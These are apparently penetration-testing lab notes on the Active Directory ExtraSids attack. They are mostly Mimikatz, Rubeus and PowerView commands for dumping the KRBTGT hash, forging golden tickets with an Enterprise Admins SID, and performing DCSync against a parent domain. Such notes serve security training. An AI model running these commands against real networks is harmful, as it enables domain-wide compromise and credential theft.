## SID History Primer

sidHistory attribute is used when migrating a user's account from one domain to another.
Using Mimikatz, an attacker can perform SID history injection and add an administrator account or Domain Admin account to the SID History attribute of an account they control.

## ExtraSids Attack - Mimikatz
- Allows for the compromise of a parent domain once the child domain has been compromised.
- Leverage SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

After compromising a child domain, we need:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.

**Obtaining the KRBTGT Account's NT Hash using Mimikatz
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

**Using Get-DomainSID (PowerView)
```
Get-DomainSID
```

**Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

**Creating a Golden Ticket with Mimikatz
```
mimikatz.exe
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

**Confirming a Kerberos Ticket in Memory
```
klist
```

**Listing the Entire C: Drive of the Domain Controller
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```


## ExtraSids Attack - Rubeus

**Creating a Golden Ticket with Rubeus
```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
klist
```

**Performing a DCSync Attack
```
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

Target domain is not the same as the user's domain:
```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```


